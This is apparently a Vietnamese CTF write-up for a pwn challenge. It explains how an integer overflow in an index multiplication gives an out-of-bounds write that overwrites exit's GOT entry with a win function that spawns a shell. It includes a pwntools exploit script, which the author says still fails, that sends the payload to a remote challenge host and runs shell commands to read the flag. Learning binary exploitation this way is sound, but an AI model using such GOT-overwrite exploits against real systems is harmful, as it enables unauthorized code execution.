## Lược qua:

**Bài này là nâng cao của [`Easyyyyyyyyyyyyyyyy`](https://github.com/geetHup9n0L/kcscTF_recruitment2026/blob/main/pwn_Easyyyyyyyyyyyyyyyy.md), 
vẫn tận dụng lỗ hổng OOB (Out-of-bound) để write vào địa chỉ các chức năng libc trên memory, bên cạnh đó sẽ là lỗ hổng Interger Overflow (tràn số nguyên có dấu).**


___
## Hướng giải:
### Thông tin:
Các files cung cấp vẫn giống bài `Easyyy..`
```c
└─$ file test 
test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ec52346b8150e97d895157fe88a7b60f078eee72, for GNU/Linux 3.2.0, not stripped
```
```c
└─$ checksec --file=test
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   58 Symbols  No     0               5               test
```
* `NO RELRO`: overwrite được GOT
* `NO PIE`: các địa chỉ là cố định

Output binary:

<img width="811" height="210" alt="image" src="https://github.com/user-attachments/assets/28bd1006-f774-421e-92c4-f1d0fc5ab934" />

Trong disassemly code, hàm main() vẫn thế:
```c

void main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  int userinput;
  undefined8 local_20;
  undefined8 id;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  puts("Welcome to TTV!");
  puts("First, create a user.");
  create();
  puts("User created! ID: 0");
LAB_00401711:
  menu();
  printf("Input your choice:");
  __isoc99_scanf(&DAT_00402175,&userinput);
  if (userinput == 4) {
    puts("Exiting... Goodbye!");
    FUN_004011e0(0);
  }
  else {
    if (4 < userinput) goto LAB_0040180d;
    if (userinput == 3) {
      make_noise();
      goto LAB_00401711;
    }
    if (userinput < 4) {
      if (userinput == 1) {
        id = input_player();
        printf("User created! ID: %d\n",id);
      }
      else {
        if (userinput != 2) goto LAB_0040180d;
        printf("Input id to view: ");
        __isoc99_scanf(&DAT_00402060,&local_20);
        view(local_20);
      }
      goto LAB_00401711;
    }
  }
LAB_0040180d:
  puts("Invalid choice. Try again.");
  goto LAB_00401711;
}
```
Hàm win(): (target)
```c
void win(void)

{
  system("/bin/sh");
  return;
}
```
___
### Khai thác:
**Thay đổi trong code đáng chú ý nằm ở hàm `input_user()`**:
```c
ulong input_player(void)

{
  int iVar1;
  long in_FS_OFFSET;
  ulong id;            //////////////////
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Input user \'s id:");
  iVar1 = __isoc99_scanf(&DAT_00402060,&id);
  if (iVar1 == 1) {
    if (id < 230584300921369395) {      //////////////////////
      printf("Input user \'s name:");   
      read(0,users + id * 80,80);
    }
    else {
      printf("Error: ID %llu is too large or invalid.\n",id);
      id = 0xffffffffffffffff;
    }
  }
  else {
    id = 0xffffffffffffffff;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return id;
}
```
**Thay đổi:**
* bây giờ, data type của `id` là kiểu số không âm `ulong` (unsigned long), và có kích thước rất to = `8 byte` (64 bit)

* một cái check mới `if (id < 230584300921369395)` với giá trị rất lớn

==> Đây là nơi diễn ra lổ hổng mới: **Integer Overflow** 

    Lỗ hổng này là khi biến mang giá trị lớn hơn giá trị được định ra bởi kiểu dữ liệu của nó

**Đánh giá:**
* `ulong id` nên id chỉ nhận giá trị **dương**, muốn write OOB phải gián tiếp biến value `id` < 0
  
* `read(0,users + id * 80,80);` chức năng để overwrite vào memory, xuất phát từ global variable: `<users>`, cấp phát vùng nhớ cho mỗi `id` 80 bytes, truy cập vùng nhớ tại `users + id * 80` 

* Vì sao kiểm tra `if (id < 230584300921369395)`?:
  * ta biết `ulong id` nhận giá trị trong khoảng:
    ```
    0 --> 18,446,744,073,709,551,615 ( 2^64-1 ).
    ```
  * giả sử `id` có thể mang giá trị MAX = `230584300921369395`
  * tính `id * 80` = `230584300921369395 * 80` = `18446744073709551600` xấp xỉ gần giá trị MAX của **unsigned long**. Đây là địa chỉ xa nhất có thể cấp phát cho `id`.

* Vậy lỗi nằm ở Integer Overflow trong phép nhân của `id * 80`
  * Biểu diễn qua hex:
    ```
    id * 80
    = 18446744073709551600
    mod 2^64
    = 0xFFFFFFFFFFFFFFF0
    ```
  * Biểu diễn nhị phân:
    ```
    <1>1111111 11111111 11111111 11111111 11111111 11111111 11111111 11110000
    =========================================================================
    unsigned long:
      9223372036854775808 + ... +  ... = 18446744073709551600
    signed long:
      -9223372036854775808 + ... + ... = -16
    ```
  * `id * 80` nếu là uint long thì mang giá trị rất lơn như trên.
  * Nhưng trong trường hợp trên, `users + id * 80`, nó đóng vai trò là 1 offset, pointer arithmetic, thì nó sẽ được đưa về kiểu dữ liệu `signed 64-bit`, tương đương:
    ```
    (signed 64-bit) 0xFFFFFFFFFFFFFFF0 = -16 
    ```
  ==> OOB write khả thi

**Notes**: Phần giải thích đây khá là lộn xộn, sẽ tối ưu khi hiểu sâu về vấn đề này hơn
___
### **TL;DR**

Lấy `id` lớn nhất, và nó sẽ thành số âm, `read()` sẽ truy cập ngược lại các địa chỉ GOT và overwrite với `win()` 

```c
if (id < 230584300921369395) {      
      printf("Input user \'s name:");   
      read(0,users + id * 80,80);
    }
...
```
**TH1**: có max `id` = 230584300921369394
* tính offset ở dạng signed long `id * 80`
  ```c
  unsigned 64-bit:
  = 230584300921369394 × 80 = 18,446,744,073,709,551,520
  HEX:
  = 0xFFFFFFFFFFFFFFA0
  signed 64-bit:
  = −96
  ```
Nhưng:

Như lần trước, lấy mục tiêu là địa chỉ `exit@` để overwrite với `win()`, tính offset:
```c
└─$ nm test | grep users
00000000004036a0 B users
```
```c
└─$ readelf -r test | grep exit 
000000403630  001000000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```
```c
offset = 0x4036a0 - 0x403630 = 0x70 = 112
```
`exit@` cách `user` = -112 bytes ==> TH1 loại.

**TH2**: có max `id` = 230584300921369393
* tính offset ở dạng signed long `id * 80`
  ```c
  unsigned 64-bit:
  = 230584300921369393 × 80 = 18446744073709551440
  HEX:
  = 0xFFFFFFFFFFFFFF50
  signed 64-bit:
  = −176
  ```
==> dư ra 64 bytes để tiến đến `exit@`

Vì vậy, payload của ta sẽ xuất phát từ địa chỉ `<user> - 176` = `0x4035f0`, tiến lên địa chỉ `exit@` và overwrite

Bởi vì `NO PIE`, sẽ giữ giá trị GOT khác trong payload, tránh corrupted và crash

<img width="669" height="115" alt="image" src="https://github.com/user-attachments/assets/44f09530-abe3-4d72-8394-5d58ca4dccc1" />

```asm
0x4035f0 <setbuf@got.plt>:      0x0000000000401080      0x0000000000401090
0x403600 <printf@got.plt>:      0x00000000004010a0      0x00000000004010b0
0x403610 <read@got.plt>:        0x00000000004010c0      0x00000000004010d0
0x403620 <perror@got.plt>:      0x00000000004010e0      0x00000000004010f0
0x403630 <exit@got.plt>:        0x0000000000401100      0x0000000000000000
```

Và đây là biễu diễn memory khi chương trình bị crash:

<img width="808" height="776" alt="image" src="https://github.com/user-attachments/assets/713ff3f5-f4c0-4b6b-9a40-c88fa4eff5be" />

Script tạm thời (vì nó lỗi):
```python
from pwn import *

# --------------------------------------------------
# Setup
# --------------------------------------------------
exe = context.binary = ELF('./test')
context.log_level = 'info'

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        br *main+129
        br *main+208
        x/50gx 0x403630 
        ''')

info = lambda msg: log.info(msg)
sla  = lambda msg, data: p.sendlineafter(msg, data)
sa   = lambda msg, data: p.sendafter(msg, data)
sl   = lambda data: p.sendline(data)
s    = lambda data: p.send(data)

# --------------------------------------------------
# Connection
# --------------------------------------------------
if args.REMOTE:
    p = remote("67.223.119.69", 5000)   
else:
    p = process(exe.path)

# GDB()

# --------------------------------------------------
# Stage 1: Leak PIE / exe base
# --------------------------------------------------
max_id = b"230584300921369393"
sla(b'a user.\n', b'1')
sla(b'your choice:', b'1')
sla(b'user \'s id:', max_id)

payload = p64(0x0000000000401080) + p64(0x0000000000401090)
payload += p64(0x00000000004010a0) + p64(0x00000000004010b0)
payload += p64(0x00000000004010c0) + p64(0x00000000004010d0)
payload += p64(0x00000000004010e0) + p64(0x00000000004010f0)
# payload += p64(0x0000000000401100) 
payload += p64(0x00000000004012d6)


sla(b'user \'s name:', payload)


# sla(b'your choice:', b'4')
context
p.sendline(b"ls; cat flag.txt")
p.interactive()
```

<!!!>
Hiện tại đang bị gặp lỗi nên đang trong quá trình tìm lỗi:

<img width="701" height="688" alt="image" src="https://github.com/user-attachments/assets/981d5ed2-983a-42ac-a1bd-a222ee203d47" />







